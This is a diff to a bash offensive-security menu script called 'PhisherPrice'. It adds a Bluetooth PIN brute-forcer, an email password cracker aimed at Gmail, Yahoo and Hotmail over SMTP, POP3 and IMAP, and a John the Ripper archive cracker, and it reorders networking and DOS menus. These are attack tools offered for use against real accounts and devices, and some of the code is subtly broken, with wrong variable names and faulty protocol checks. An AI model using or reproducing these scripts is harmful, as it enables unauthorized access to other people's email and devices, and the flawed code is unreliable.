@@ -928,34 +928,131 @@ clear
                    \e[0m\e[3;39m \e[1;31m
 Cracking / Brute Force
 \e[3;39m
-(1) Auto-Brute (Hydra)
-(2) John-The-Ripper
-(3) Hash-Identifier
-(4) Hashcat
-(5) Aircrack-ng (Crack Wifi Pass)
-(6) Start sqldict
-(7) Wifi Honey Pot Cracker
-(8) Just Dump It
+(1) Bluetooth Toolkit
+(2) Auto-Brute (Hydra)
+(3) John-The-Ripper
+(4) Archive Password Cracker
+(5) Hash-Identifier
+(6) Hashcat
+(7) Aircrack-ng (Crack Wifi Pass)
+(8) Start sqldict
+(9) Wifi Honey Pot Cracker
+(10) Just Dump It
 
 CTRL + C To Exit
 
 Press ENTER To Go To Main Menu
 '
-subf='1'
-subg='2'
-subh='3'
-subi='4'
-subj='5'
-subk='6'
-honeywhy='7'
-dumpitall='8'
+bluetoothc='1'
+subf='2'
+subg='3'
+john2='4'
+subh='5'
+subi='6'
+subj='7'
+subk='8'
+honeywhy='9'
+dumpitall='10'
 
 
 wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Cracking/Brute$Blue]:"
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
 
-if [ "$x" == "$subf" ]; then                    #Sub-Option-f
+if [ "$x" == "$bluetoothc" ]; then                    #blueooth
+clear
+	echo -e "${banner}"
+	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
+                   
+\e[0m\e[3;39m \e[1;31m
+Bluetooth Toolkit
+\e[3;39m
+(1) Bluetooth device scanner
+(2) Bluetooth PIN Code Cracker
+
+CTRL + C To Exit
+
+Press ENTER To Go To Main Menu
+'
+bscan='1'
+bcrack='2'
+
+echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Bluetooth-Toolkit$Blue]:"
+echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+
+if [ "$x" == "$bscan" ]; then                    #bscan
+echo -e "\nBluetooth device scanner"
+echo -e "-------------------------------------------\n"
+
+echo "Scanning for nearby devices..."
+devices=$(hcitool scan | grep -oP '^\S+\s+\K.*')
+
+if [ -z "$devices" ]; then
+  echo -e "\nNo devices found."
+  read
+fi
+
+echo -e "\n-------------------------------------------"
+echo "Nearby devices:"
+echo -e "-------------------------------------------\n"
+
+echo "$devices"
+
+echo -e "\n-------------------------------------------"
+echo -e "Enter the MAC address of the device to connect: "
+read mac_address
+
+echo "Connecting to $mac_address..."
+rfcomm connect /dev/rfcomm0 "$mac_address" 1 &
+sleep 1
+
+if [[ $(echo $?) -ne 0 ]]; then
+  echo -e "\nFailed to connect to $mac_address."
+  read
+fi
+
+echo -e "\nSuccessfully connected to $mac_address."
+
+elif [ "$x" == "$bcrack" ]; then                    #bcrack
+clear
+echo -e "\e[1;33mBluetooth PIN Code Cracking Script.\e[0m"
+echo -e "\n-------------------------------------------"
+
+echo -n "Enter the MAC address of the target device: "
+read mac_address
+echo -n "Enter the name of the PIN code file: "
+read pin_file
+
+clear
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;34mCracking Bluetooth PIN code...\e[0m"
+echo -e "-------------------------------------------\n"
+
+while read pin; do
+  echo "Trying PIN code: $pin"
+  rfcomm connect hci0 "$mac_address" "$pin" 1>/dev/null 2>&1
+  
+  if [[ $? -eq 0 ]]; then
+    echo -e "\n-------------------------------------------"
+    echo -e "\e[1;32mPIN code found!\e[0m"
+    echo -e "-------------------------------------------"
+    echo -e "PIN code: $pin"
+    read -p "Press Enter to continue."
+    break
+  fi
+  
+done < "$pin_file"
+
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;31mPIN code not found.\e[0m"
+echo -e "-------------------------------------------"
+read -p "Press Enter to continue."
+
+else
+n
+fi
+
+elif [ "$x" == "$subf" ]; then                    #Sub-Option-f
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
@@ -978,6 +1075,7 @@ CTRL + C To Exit
 
 Press ENTER To Go To Main Menu
 '
+nohydra='0'
 hynull1='1'
 hynull2='2'
 hynull3='3'
@@ -992,7 +1090,134 @@ HYDRAWPAUTOBRUTE='10'
 echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
 
-if [ "$x" == "$hynull1" ]; then                    #hynull-Option-1
+
+if [ "$x" == "$nohydra" ]; then                    #no hydra
+clear
+# Define SMTP options
+declare -A smtp_options=(
+  ["gmail"]="smtp.gmail.com:587"
+  ["yahoo"]="smtp.mail.yahoo.com:587"
+  ["hotmail"]="smtp.live.com:587"
+)
+
+# Define POP3 options
+declare -A pop3_options=(
+  ["gmail"]="pop.gmail.com:995"
+  ["yahoo"]="pop.mail.yahoo.com:995"
+  ["hotmail"]="outlook.office365.com:995"
+)
+
+# Define IMAP options
+declare -A imap_options=(
+  ["gmail"]="imap.gmail.com:993"
+  ["yahoo"]="imap.mail.yahoo.com:993"
+  ["hotmail"]="outlook.office365.com:993"
+)
+
+# Display banner
+echo -e '\e[1;33m
+   _____                       __    
+  / ___ \____________    ____ |  | __
+ / / ._\ \_  __ \__  \ _/ ___\|  |/ /
+<  \_____/|  | \// __ \\  \___|    < 
+ \_____\  |__|  (____  /\___  >__|_ \
+                     \/     \/     \/\e[1;34m
+'
+echo -e "\e[1;33mSimple Email Cracking Script.\e[0m"
+echo -e "\n-------------------------------------------"
+
+# Select email service
+echo "Choose an email service:"
+echo "SMTP:"
+for service in "${!smtp_options[@]}"; do
+  echo "[$service] ${smtp_options[$service]}"
+done
+echo "POP3:"
+for service in "${!pop3_options[@]}"; do
+  echo "[$service] ${pop3_options[$service]}"
+done
+echo "IMAP:"
+for service in "${!imap_options[@]}"; do
+  echo "[$service] ${imap_options[$service]}"
+done
+
+read -p "Email service: " email_service
+
+# Select protocol and port based on the email service chosen
+case $email_service in
+  "gmail")
+    smtp="${smtp_options[$email_service]}"
+    pop3="${pop3_options[$email_service]}"
+    imap="${imap_options[$email_service]}"
+    ;;
+  "yahoo")
+    smtp="${smtp_options[$email_service]}"
+    pop3="${pop3_options[$email_service]}"
+    imap="${imap_options[$email_service]}"
+    ;;
+  "hotmail")
+    smtp="${smtp_options[$email_service]}"
+    pop3="${pop3_options[$email_service]}"
+    imap="${imap_options[$email_service]}"
+    ;;
+  *)
+    echo "Invalid email service"
+    read
+    ;;
+esac
+
+# Get email address and password file path
+echo -n "Enter email address: "
+read email
+echo -n "Enter password file path: "
+read password_file
+
+# Select protocol and port
+echo -n "Enter protocol (smtp/pop3/imap): "
+read protocol
+echo -n "Enter port number: "
+read port
+
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;34mCracking email password...\e[0m"
+echo -e "-------------------------------------------"
+while read password; do
+  case $protocol in
+    "smtp")
+      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$smtp_host" "$port")
+      ;;
+    "pop3")
+      pop_host=$(echo "$pop" | cut -d: -f1)
+      pop_port=$(echo "$pop" | cut -d: -f2)
+      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$pop_host" "$pop_port")
+      ;;
+    "imap")
+      imap_host=$(echo "$imap" | cut -d: -f1)
+      imap_port=$(echo "$imap" | cut -d: -f2)
+      response=$(echo "a login $email $password" && echo "b select inbox" && echo "c logout" | nc -w 10 "$imap_host" "$imap_port")
+      ;;
+    *)
+      echo -e "\n-------------------------------------------"
+      echo -e "\e[1;31mInvalid protocol.\e[0m"
+      echo -e "-------------------------------------------"
+      read
+      read
+  esac
+  
+  if [[ "$response" == *"+OK"* ]]; then
+    echo -e "\n-------------------------------------------"
+    echo -e "\e[1;32mPassword found!\e[0m"
+    echo -e "-------------------------------------------"
+    echo -e "Email: $email"
+    echo -e "Password: $password"
+    read
+  fi
+done < "$password_file"
+
+read
+
+
+elif [ "$x" == "$hynull1" ]; then                    #hynull-Option-1
 clear
 echo -e '\e[1;33m
    _____                       __    
@@ -1412,6 +1637,39 @@ echo -e "-------------------------------------------\n"
 
 read -p "Press Enter to continue." 
 
+elif [ "$x" == "$john2" ]; then                    #john2
+echo "Enter the path to the archive file:"
+read archive
+
+if [ ! -f "$archive" ]; then
+echo "File not found!"
+read -p "Press Enter to continue." 
+fi
+
+echo "Enter the path to the password list file:"
+read passlist
+
+if [ ! -f "$passlist" ]; then
+echo "File not found!"
+read -p "Press Enter to continue." 
+fi
+
+if [[ "$archive" == *.zip ]]; then
+john --format=zip --wordlist="$passlist" "$archive"
+elif [[ "$archive" == *.rar ]]; then
+john --format=rar --wordlist="$passlist" "$archive"
+elif [[ "$archive" == *.7z ]]; then
+john --format=7z --wordlist="$passlist" "$archive"
+elif [[ "$archive" == *.tar ]]; then
+john --format=tar --wordlist="$passlist" "$archive"
+elif [[ "$archive" == *.tar.gz ]]; then
+john --format=targz --wordlist="$passlist" "$archive"
+elif [[ "$archive" == *.tar.bz2 ]]; then
+john --format=tarbz2 --wordlist="$passlist" "$archive"
+else
+echo "Unknown archive format!"
+read -p "Press Enter to continue." 
+fi
 elif [ "$x" == "$subh" ]; then                    #Sub-Option-h
 clear
 echo -e "\nHash Identifier"
@@ -2203,7 +2461,7 @@ clear
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                    
 \e[0m\e[3;39m \e[1;31m
-WI-FI xSploits
+Networking
 \e[3;39m
 (1) Stealth ARP Scan
 (2) Passive ARP Scan
@@ -2237,34 +2495,8 @@ wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
 
-if [ "$x" == "$suba" ]; then                    #Sub-Option-a
-clear
-echo -e '\e[1;33m
-  _________ __                .__   __  .__         _____                
- /   _____//  |_  ____ _____  |  |_/  |_|  |__     /  _  \_____________  
- \_____  \\   __\/ __ \\__  \ |  |\   __\  |  \   /  /_\  \_  __ \____ \ 
- /        \|  | \  ___/ / __ \|  |_|  | |   Y  \ /    |    \  | \/  |_> >
-/_______  /|__|  \___  >____  /____/__| |___|  / \____|__  /__|  |   __/ 
-        \/           \/     \/               \/          \/      |__|    \e[1;34m
-'
-echo -e "\nNetwork Scanning with arp-scan"
-echo -e "-------------------------------------------\n"
 
-echo "Example IP Usage: 192.168.9.99"
-echo "Enter the IP address to scan: " 
-read subopa
-
-echo -e "\nStarting network scan...\n"
-
-if arp-scan -l -s $subopa -v; then
-    echo -e "\nNetwork scan complete.\n"
-else
-    echo -e "\nNetwork scan failed.\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$subdosm" ]; then                          #DOS
+if [ "$x" == "$subdosm" ]; then                          #DOS
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -2507,6 +2739,33 @@ done
 
 echo "Attack finished."
 read
+
+elif [ "$x" == "$suba" ]; then                    #Sub-Option-a
+clear
+echo -e '\e[1;33m
+  _________ __                .__   __  .__         _____                
+ /   _____//  |_  ____ _____  |  |_/  |_|  |__     /  _  \_____________  
+ \_____  \\   __\/ __ \\__  \ |  |\   __\  |  \   /  /_\  \_  __ \____ \ 
+ /        \|  | \  ___/ / __ \|  |_|  | |   Y  \ /    |    \  | \/  |_> >
+/_______  /|__|  \___  >____  /____/__| |___|  / \____|__  /__|  |   __/ 
+        \/           \/     \/               \/          \/      |__|    \e[1;34m
+'
+echo -e "\nNetwork Scanning with arp-scan"
+echo -e "-------------------------------------------\n"
+
+echo "Example IP Usage: 192.168.9.99"
+echo "Enter the IP address to scan: " 
+read subopa
+
+echo -e "\nStarting network scan...\n"
+
+if arp-scan -l -s $subopa -v; then
+    echo -e "\nNetwork scan complete.\n"
+else
+    echo -e "\nNetwork scan failed.\n"
+fi
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$subb" ]; then                    #Sub-Option-b
 clear
